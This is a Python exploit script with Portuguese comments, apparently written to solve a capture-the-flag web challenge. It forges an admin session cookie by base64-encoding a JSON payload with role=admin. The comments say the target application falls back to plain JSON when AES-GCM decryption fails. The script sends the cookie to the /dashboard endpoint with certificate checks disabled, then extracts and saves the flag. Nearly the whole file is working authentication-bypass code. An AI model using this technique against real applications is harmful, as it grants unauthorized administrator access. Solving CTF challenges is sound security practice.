#!/usr/bin/env python3
import base64
import json
import os
import re
import time
import requests
import urllib3

# Desativa warning de certificado caso o alvo responda em HTTPS com certificado inválido.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Alvo do desafio. Pode ser sobrescrito com:
# TARGET=http://host python3 script1.py
TARGET = os.environ.get("TARGET", "http://e22327817c4ca081.chal.ctf.ae").rstrip("/")

def build_forged_cookie():
    """
    Cria um cookie falso aceito pela função decrypt_session().

    A aplicação tenta primeiro decifrar AES-GCM.
    Como nosso cookie não é AES-GCM válido, isso gera exceção.

    Em seguida, por causa do fallback inseguro, ela executa:
        json.loads(base64.b64decode(cookie))

    Então basta enviar JSON puro em Base64 com role=admin.
    """
    session_data = {
        "user": "guerreiro",
        "role": "admin",
        "iat": int(time.time())
    }

    raw_json = json.dumps(session_data, separators=(",", ":")).encode()
    token = base64.b64encode(raw_json).decode()

    return token, session_data

def main():
    token, session_data = build_forged_cookie()

    print("[*] Target:", TARGET)
    print("[*] Sessão forjada:", session_data)
    print("[*] Cookie session_token:", token)
    print()

    url = TARGET + "/dashboard"

    # Envia o cookie forjado diretamente para o dashboard.
    response = requests.get(
        url,
        cookies={"session_token": token},
        timeout=15,
        verify=False,
        allow_redirects=False,
    )

    print("=" * 80)
    print("RESPOSTA HTTP")
    print("=" * 80)
    print("Status:", response.status_code)
    print("URL:", url)
    print()

    print("=" * 80)
    print("CORPO DA RESPOSTA")
    print("=" * 80)
    print(response.text)
    print()

    # Procura automaticamente a flag no HTML.
    match = re.search(r"flag\{[^}\r\n]+\}", response.text, re.IGNORECASE)

    print("=" * 80)
    print("RESULTADO")
    print("=" * 80)

    if match:
        flag = match.group(0)
        print("[+] FLAG ENCONTRADA:", flag)

        with open("flag.txt", "w", encoding="utf-8") as f:
            f.write(flag + "\n")

        print("[+] Flag salva em flag.txt")
        return

    print("[-] Flag não encontrada automaticamente.")
    print("[-] Verifique se o alvo está usando HTTP ou se o host expirou.")

if __name__ == "__main__":
    main()
